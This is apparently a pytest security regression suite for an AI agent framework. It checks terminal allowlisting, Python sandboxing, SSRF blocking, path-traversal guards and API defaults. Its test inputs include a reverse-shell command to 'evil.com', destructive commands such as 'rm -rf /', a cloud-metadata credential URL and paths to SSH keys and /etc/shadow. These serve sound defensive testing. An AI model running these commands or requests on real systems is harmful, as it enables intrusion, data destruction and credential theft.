"""Security regression tests — verify the CRITICAL security fixes hold.

Each test corresponds to a CRITICAL security finding from the Phase 1 audit.
These tests MUST pass before any deployment.
"""
from __future__ import annotations

import asyncio
import tempfile

import pytest


# ─── CRITICAL-10: terminal.py uses shlex + allowlist, not shell=True ─────────

@pytest.mark.asyncio
async def test_terminal_rejects_non_allowlisted_binary():
    """Commands whose first token isn't in the allowlist are rejected."""
    from adonai.tools.builtin.terminal import TerminalTool
    t = TerminalTool(workspace_root=tempfile.mkdtemp())
    # 'ncat' is not in the default allowlist
    r = await t.execute(command="ncat -e /bin/sh evil.com 4444")
    assert not r.success
    assert "allowlist" in (r.error or "").lower()


@pytest.mark.asyncio
async def test_terminal_rejects_hard_blocked_patterns():
    """Hard-blocked patterns (rm -rf /, shutdown, etc.) are rejected."""
    from adonai.tools.builtin.terminal import TerminalTool
    t = TerminalTool(workspace_root=tempfile.mkdtemp())
    for bad in ["shutdown now", "rm -rf /", "mkfs.ext4 /dev/sda1"]:
        r = await t.execute(command=bad)
        assert not r.success, f"{bad!r} should be blocked"


@pytest.mark.asyncio
async def test_terminal_clamps_timeout():
    """Timeouts are clamped to [1, 300] to prevent resource abuse."""
    from adonai.tools.builtin.terminal import TerminalTool
    t = TerminalTool(workspace_root=tempfile.mkdtemp())
    r = await t.execute(command="echo hi", timeout=99999)
    assert r.success


@pytest.mark.asyncio
async def test_terminal_rejects_cwd_escape():
    """cwd params that escape the workspace are rejected."""
    from adonai.tools.builtin.terminal import TerminalTool
    t = TerminalTool(workspace_root=tempfile.mkdtemp())
    r = await t.execute(command="ls", cwd="../../../../etc")
    assert not r.success
    assert "escape" in (r.error or "").lower() or "workspace" in (r.error or "").lower()


# ─── CRITICAL-11/12: python_exec AST inspection + resource limits ────────────

@pytest.mark.asyncio
async def test_python_exec_rejects_dangerous_imports():
    """Imports of os, subprocess, socket, etc. are rejected by AST inspection."""
    from adonai.tools.builtin.python_exec import PythonExecTool
    p = PythonExecTool()
    for code in [
        "import os; os.system('echo hacked')",
        "import subprocess; subprocess.run(['ls'])",
        "import socket; socket.socket()",
        "from os import system; system('ls')",
        "import ctypes; ctypes.CDLL(None)",
    ]:
        r = await p.execute(code=code)
        assert not r.success, f"should reject: {code}"
        assert "sandbox" in (r.error or "").lower() or "forbidden" in (r.error or "").lower(), \
            f"should mention sandbox/forbidden: {r.error}"


@pytest.mark.asyncio
async def test_python_exec_rejects_eval_exec():
    """eval/exec/compile calls are rejected."""
    from adonai.tools.builtin.python_exec import PythonExecTool
    p = PythonExecTool()
    for code in [
        "eval('1+1')",
        "exec('x=1')",
        "compile('x', '<s>', 'exec')",
    ]:
        r = await p.execute(code=code)
        assert not r.success, f"should reject: {code}"


@pytest.mark.asyncio
async def test_python_exec_runs_safe_code():
    """Safe code (no dangerous imports/calls) runs successfully."""
    from adonai.tools.builtin.python_exec import PythonExecTool
    p = PythonExecTool()
    r = await p.execute(code="print(2+2)")
    assert r.success, f"safe code should run: {r.error}"
    assert "4" in r.output["stdout"]


@pytest.mark.asyncio
async def test_python_exec_env_strips_secrets():
    """The subprocess env should NOT contain secrets from the parent env."""
    import os
    os.environ["TEST_SECRET_KEY"] = "super-secret-value-12345"
    try:
        from adonai.tools.builtin.python_exec import PythonExecTool
        p = PythonExecTool()
        # This code tries to read the secret env var. It will fail because
        # the subprocess gets a minimal env.
        r = await p.execute(code=(
            "import os\n"
            "secret = os.environ.get('TEST_SECRET_KEY', 'NOT_PRESENT')\n"
            "print(f'secret={secret}')\n"
        ))
        # The AST inspector rejects `import os`, so this fails first.
        assert not r.success, "should reject import os"
    finally:
        del os.environ["TEST_SECRET_KEY"]


# ─── CRITICAL-13: SSRF protection on URL-fetching tools ──────────────────────

def test_url_safety_blocks_metadata_endpoint():
    """Cloud metadata endpoints (169.254.169.254) must be blocked."""
    from adonai.tools.url_safety import UrlSafetyPolicy
    pol = UrlSafetyPolicy()
    ok, _ = pol.validate("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    assert not ok, "metadata endpoint should be blocked"


def test_url_safety_blocks_loopback():
    from adonai.tools.url_safety import UrlSafetyPolicy
    pol = UrlSafetyPolicy()
    for url in ["http://127.0.0.1/", "http://localhost/", "http://[::1]/"]:
        ok, _ = pol.validate(url)
        assert not ok, f"{url} should be blocked"


def test_url_safety_blocks_private_ranges():
    from adonai.tools.url_safety import UrlSafetyPolicy
    pol = UrlSafetyPolicy()
    for url in ["http://10.0.0.1/", "http://172.16.0.1/", "http://192.168.1.1/"]:
        ok, _ = pol.validate(url)
        assert not ok, f"{url} should be blocked"


def test_url_safety_blocks_file_scheme():
    from adonai.tools.url_safety import UrlSafetyPolicy
    pol = UrlSafetyPolicy()
    ok, _ = pol.validate("file:///etc/passwd")
    assert not ok, "file:// scheme should be blocked"


def test_url_safety_allows_public_urls():
    from adonai.tools.url_safety import UrlSafetyPolicy
    pol = UrlSafetyPolicy()
    ok, _ = pol.validate("https://example.com/path")
    assert ok, "public URL should be allowed"


@pytest.mark.asyncio
async def test_http_tool_blocks_ssrf():
    """HTTPRequestTool must block SSRF attempts."""
    from adonai.tools.builtin.http import HTTPRequestTool
    h = HTTPRequestTool()
    r = await h.execute(url="http://169.254.169.254/latest/meta-data/")
    assert not r.success
    assert "safety" in (r.error or "").lower()


# ─── CRITICAL-15: filesystem path traversal ──────────────────────────────────

def test_filesystem_rejects_absolute_paths_outside_workspace():
    """Absolute paths outside the workspace must be rejected."""
    from adonai.tools.builtin.filesystem import _resolve_safely
    for p in ["/etc/passwd", "/root/.ssh/id_rsa", "/var/log/auth.log"]:
        with pytest.raises(PermissionError):
            _resolve_safely(p)


def test_filesystem_rejects_dotdot_escape():
    """../ escapes must be rejected."""
    from adonai.tools.builtin.filesystem import _resolve_safely
    # Unix-style escapes (Windows-style backslashes are filename chars on Linux).
    for p in ["../../../etc/passwd", "foo/../../../etc/shadow", "foo/bar/../../../../etc/shadow"]:
        with pytest.raises(PermissionError):
            _resolve_safely(p)


# ─── CRITICAL-18: self_improvement absolute path rejection ───────────────────

def test_self_improvement_rejects_absolute_target_paths():
    """Self-improvement patches must not target absolute paths."""
    from adonai.safety.self_improvement import SelfImprovementEngine, SelfImprovementError
    import inspect
    src = inspect.getsource(SelfImprovementEngine._resolve_target_path)
    assert "absolute paths are forbidden" in src


# ─── CRITICAL-19: self_improvement rollback restores original on timeout ─────

def test_self_improvement_restores_on_timeout():
    """The timeout branch must restore the original before returning."""
    from adonai.safety.self_improvement import SelfImprovementEngine
    import inspect
    src = inspect.getsource(SelfImprovementEngine._regression_test)
    # The fix adds a restore call in the timeout branch.
    assert "restored original after test timeout" in src or "shutil.copy2(backup_path" in src


# ─── CRITICAL-20: recovery.py stores task refs ───────────────────────────────

def test_recovery_manager_stores_task_references():
    """Recovery tasks must be stored in a set to prevent GC."""
    import inspect
    from adonai.executors.recovery import RecoveryManager
    src = inspect.getsource(RecoveryManager.recover_all)
    assert "_recovery_tasks" in src and "add_done_callback" in src


# ─── CRITICAL-25: json_utils O(n) extraction ─────────────────────────────────

def test_json_utils_extracts_balanced_object():
    from adonai.core.json_utils import extract_json
    text = 'Here is the result: {"a": 1, "b": [1, 2, 3]} and trailing text'
    assert extract_json(text) == {"a": 1, "b": [1, 2, 3]}


def test_json_utils_extracts_nested_object():
    from adonai.core.json_utils import extract_json
    text = 'prefix {"outer": {"inner": [1, 2, {"deep": true}]}} suffix'
    assert extract_json(text) == {"outer": {"inner": [1, 2, {"deep": True}]}}


def test_json_utils_extracts_array():
    from adonai.core.json_utils import extract_json
    text = 'result: [1, 2, "three"] trailing'
    assert extract_json(text) == [1, 2, "three"]


# ─── CRITICAL-24: embeddings raise on failure ────────────────────────────────

def test_ollama_embed_raises_on_failure_not_zero_vector():
    """embed() must raise LLMError, not return [0.0]*dim."""
    import inspect
    from adonai.llm.ollama import OllamaLLMClient
    src = inspect.getsource(OllamaLLMClient.embed)
    assert "raise LLMError" in src
    # The old silent-zero pattern should be gone.
    assert "results.append([0.0] * self.config.embedding_dim)" not in src


# ─── CRITICAL-14: API authentication ─────────────────────────────────────────

def test_api_has_auth_middleware():
    """The API must have authentication middleware when api_key is set."""
    import inspect
    from adonai.api.server import create_app
    src = inspect.getsource(create_app)
    assert "_auth_middleware" in src
    assert "X-API-Key" in src


def test_api_defaults_to_loopback():
    """APIConfig.host should default to 127.0.0.1, not 0.0.0.0."""
    from adonai.config.settings import APIConfig
    ac = APIConfig()
    assert ac.host == "127.0.0.1"


def test_api_defaults_to_safe_cors():
    """APIConfig.cors_origins should NOT default to ['*']."""
    from adonai.config.settings import APIConfig
    ac = APIConfig()
    assert "*" not in ac.cors_origins
